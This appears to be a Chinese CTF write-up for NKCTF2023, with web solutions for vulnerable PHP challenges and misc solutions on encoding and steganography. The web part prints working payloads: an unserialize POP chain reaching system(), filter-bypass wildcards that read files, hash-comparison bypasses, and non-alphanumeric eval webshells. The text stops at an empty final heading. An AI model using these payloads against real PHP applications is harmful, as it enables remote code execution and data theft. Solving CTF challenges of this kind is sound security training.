[TOC]



## NKCTF2023

### WEB

#### baby_php

```php
<?php
    error_reporting(0);
    class Welcome{
        public $name;
        public $arg = 'oww!man!!';
        public function __construct(){
            $this->name = 'ItS SO CREAZY';
        }
        public function __destruct(){
            if($this->name == 'welcome_to_NKCTF'){
                echo $this->arg;
            }
        }
    }

    function waf($string){
        if(preg_match('/f|l|a|g|\*|\?/i', $string)){
            die("you are bad");
        }
    }
    class Happy{
        public $shell;
        public $cmd;
        public function __invoke(){
            $shell = $this->shell;
            $cmd = $this->cmd;
            waf($cmd);
            eval($shell($cmd));
        }
    }
    class Hell0{
        public $func;
        public function __toString(){
            $function = $this->func;
            $function();
        }
    }

    if(isset($_GET['p'])){
        unserialize($_GET['p']);
    }else{
        highlight_file(__FILE__);
    }
?>
```

我们仔细分析一下代码，可以得到一条pop链：`Welcome->Hell0->Happy`

我们可以将Welcome类的 `$name='welcome_to_NKCTF'`，`$args=new Hell0()`

当Welcome类被销毁时，会调用 `__destruct()`方法，使用echo输出`Hell0`对象，调用Hell0的`__toString()`方法，当类Hell0对象的`$func=new Happy()`，我们以函数的形式调用一个对象时，会自动调用该对象的`__invoke()`方法，进而实现命令执行。

但是这里有一个`waf`:

```php
function waf($string){
        if(preg_match('/f|l|a|g|\*|\?/i', $string)){
            die("you are bad");
        }
    }
```

把 `flag*?`给过滤了，我们不能直接读flag，我们先构造链去获取flag的路径：

```php
<?php

class Welcome {
    public $name = "welcome_to_NKCTF";
    public $arg;
}
class Happy {
    public $shell;
    public $cmd;
}

class Hell0 {
    public $func;
}
$w = new Welcome();
$ha = new Happy();
$he = new Hell0();

$w->arg = $he;
$he->func=$ha;
$ha->shell="system";
$ha->cmd="dir /";    //此处不能使用ls，l被过滤，我们可以使用dir
echo urlencode(serialize($w));

输出：
O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22cmd%22%3Bs%3A5%3A%22dir+%2F%22%3B%7D%7D%7D
```

![image-20230327141351769](https://s2.loli.net/2023/03/27/cFnZoDHg1Je7Ejh.png)

然后我们需要去读取根目录下的 `f1ag`，但是：`fag?*`被过滤了，我们怎么才能读？

我们查询到linux下还有其他的通配符：

![image-20230327141750289](https://s2.loli.net/2023/03/27/y1zBwxnGerN3XfZ.png)

我们可以如下构造：

```linux
more /[^1]1[^1][^1]
sort /[!1]1[!1][!1]
```

成功得到flag：

![image-20230327141849776](https://s2.loli.net/2023/03/27/TXGqYmIZA6jFtUE.png)





#### eazy_php

```php
 <?php 
    highlight_file(__FILE__);
    error_reporting(0);
    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){
        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){
            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){
                if(isset($_GET['NS_CTF.go'])){
                    if(isset($_POST['cmd'])){
                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){
                            eval($_POST['cmd']);
                        }else{
                            die('error!!!!!!');
                        }
                    }else{
                        die('error!!!!!');
                    }
                }else{
                    die('error!!!!');
                }
            }else{
                die('error!!!');
            }
        }else{
            die('error!!');
        }
    }else{
        die('error!');
    }
?> 
```

第一层：

```php
if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b']))
```

md5绕过，我们可以使用数组绕过：

```
a[]=1&b[]=2
```



第二层

```php
if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d']))
```

这里需要使用sha1强碰撞绕过：

```php
c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```



第三层：

```php
if($_GET['e'] != 114514 && intval($_GET['e']) == 114514)
```

`intval()`函数 用于获取变量的整数值，如果我们传入一个小数，会被转化为整数，但是php小数与整数又不相等，所以我们可以使用小数绕过

```
e=114514.1
```



第四层：

```php
if(isset($_GET['NS_CTF.go']))
```

php中如果参数中出现非法字符，会被替换为下滑线`_`，如果出现`[`，也会被替换为下划线`_`，但是这将导致后面的非法字符不被转换（php<8）

[php非法参数转换](https://blog.csdn.net/mochu7777777/article/details/115050295)

例如：我们传入

```
?NS[CTF.go
```

由于`[`被转为下划线`_`，并导致后面的非法字符不转换，所以实际传入的变量名为：

```
?NS_CTF.go
```



第五、六层：非字母数字webshell，我们使用取反`~`绕过

```php
<?php
$func = "system";
$cmd = "ls /";
echo "(~".urlencode(~$func).")"."(~".urlencode(~$cmd).");";
```

![image-20230327144832948](https://s2.loli.net/2023/03/27/d7Z5e2OMhAu6EJ4.png)

读到flag在根目录，然后使用tac查看：

```
tac /flag
```

得到flag





#### hard_php

```php
<?php
// not only ++
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['NKCTF'])) {
    $NK = $_POST['NKCTF'];
    if (is_string($NK)) {
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$NK) && strlen($NK) < 105){
            eval($NK);
        }else{
            echo("hacker!!!");
        }
    }else{
        phpinfo();
    }
}
?>
```

过滤了好多

```php
if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$NK) && strlen($NK) < 105){
```

不能使用`异或、取反、或`好像可以使用自增，但是限制了长度，可以读些简单的东西

这是根据ctfshow rce极限挑战改编的

[ctfshowRCE极限挑战](https://blog.csdn.net/m0_64815693/article/details/127951989)

我们先读一下phpinfo()，可以传数组 `NKCTF[]=1` 绕过 `is_string()`

![image-20230327150652441](https://s2.loli.net/2023/03/27/tsfo63xB9JdQkyH.png)

我们使用如下payload：

```php
NKCTF=$_=(_/_._)[_];$_%2B%2B;$%FA=$_.$_%2B%2B;$_%2B%2B;$_%2B%2B;$_=_.$%FA.%2B%2B$_.%2B%2B$_;$$_[_]($$_[%FA]);&_=highlight_file&%FA=/flag
```

很多函数被过滤了，我们使用`highlight_file`直接读flag

![image-20230327150853413](https://s2.loli.net/2023/03/27/gBH7mVjMDGZwcrF.png)



### MISC

#### hard-misc

```
JYYHOYLZIJQWG27FQWWOJPEX4WH3PZM3T3S2JDPPXSNAUTSLINKEMMRQGIZ6NCER42O2LZF2Q3X3ZAI=
```

base32解密





#### blue

<img src="https://s2.loli.net/2023/03/27/WV46CoPBYZManhS.png" alt="image-20230327151507045" style="zoom:50%;" />

下载后得到windows镜像，

![image-20230327151607984](https://s2.loli.net/2023/03/27/4vMzOe5SWmxtnsg.png)

我们直接使用7z打开：

<img src="https://s2.loli.net/2023/03/27/jnSKicCMmO5IHhq.png" alt="image-20230327152144402" style="zoom:50%;" />

找到flag





#### 三体

下载得到一张bmp图片

<img src="https://s2.loli.net/2023/03/27/DcviSEVNuBIfdC5.png" alt="image-20230327155216450" style="zoom:33%;" />

文件尾存在部分flag：

![image-20230327155934723](https://s2.loli.net/2023/03/27/a2TnZNUGEVvpKWd.png)

注意要将编码方式改为ASCII码：

<img src="https://s2.loli.net/2023/03/27/KWiquGX5aobmFdV.png" alt="image-20230327160010888" style="zoom: 67%;" />

然后我们使用`zsteg -a`，分析bmp图片隐写：

![image-20230327161403334](https://s2.loli.net/2023/03/27/D1aXOMBRZlEnGQz.png)

这里可能存在flag，我们把它分离出来：`zsteg -E`

![image-20230327161517721](https://s2.loli.net/2023/03/27/uIkVPoc78sRpFJQ.png)



获得了一个txt文件

<img src="https://s2.loli.net/2023/03/27/1z5ZjQxnWIbrgcG.png" alt="image-20230327161540672" style="zoom: 67%;" />

我们查找一下另一半flag：

![image-20230327161625562](https://s2.loli.net/2023/03/27/XEa5YCyKM3Nntp4.png)

找到了，然后我们只需要倒过来就得到flag





#### easy_rgb

下载后得到一个加密得rar包

![image-20230327161726589](https://s2.loli.net/2023/03/27/enq5gascG87m2Tt.png)

和一个存在很多图片得压缩包key

![image-20230327161816521](https://s2.loli.net/2023/03/27/uKDCidNwhS2yO7o.png)

我们使用 `montage`将图片拼接起来：（这里有180张图片，我们使用18x10的行列）

```
montage *png -tile 18x10 -geometry +0+0 flag.png
```

![image-20230327162344798](https://s2.loli.net/2023/03/27/ec1stVFdPrnGNE5.png)然后再用`gaps`命令，进行排序：

<img src="https://s2.loli.net/2023/03/27/MsYEPXqelNmoh4F.png" alt="image-20230327162506982" style="zoom: 67%;" />

因为每张图片是125像素，所以我们这么写：

```
gaps --image flag.png --size=125
```

拼图成功：

![image-20230327162621107](https://s2.loli.net/2023/03/27/M5on68FzIVrw1iJ.png)

得到key：`NKCTF2023`

使用key将压缩包进行解压：

<img src="https://s2.loli.net/2023/03/27/DHzBOyXqTdKYNZP.png" alt="image-20230327162921052" style="zoom: 67%;" />

txt文件里面都是数字，我们猜测需要将里面的数字拼起来，形成某种文件。

我们按照rgb的顺序进行拼接，上脚本：

```python
import binascii

r = open("C://Users/LIKE/Desktop/r.txt", 'r')
g = open("C://Users/LIKE/Desktop/g.txt", 'r')
b = open("C://Users/LIKE/Desktop/b.txt", 'r')
rs = r.read()
gs = g.read()
bs = b.read()
count = 0
s = ""
for i in range(0, 150):
    s = s + rs[count:count+1]
    s = s + gs[count:count+1]
    s = s + bs[count:count+1]
    count = count + 1

f = open("C://Users/LIKE/Desktop/flag.zip","wb")
f.write(binascii.unhexlify(s))
```

打开zip文件：

![image-20230327163906465](https://s2.loli.net/2023/03/27/PLNWZ12MYFzpjUQ.png)

提示为：`AES-128加密`

我们找个网站解密：[AES-128解密](https://tool.lmeee.com/jiami/aes)

![image-20230327164548603](https://s2.loli.net/2023/03/27/C3ZMumvxo8HN5s6.png)



#### easy_word

















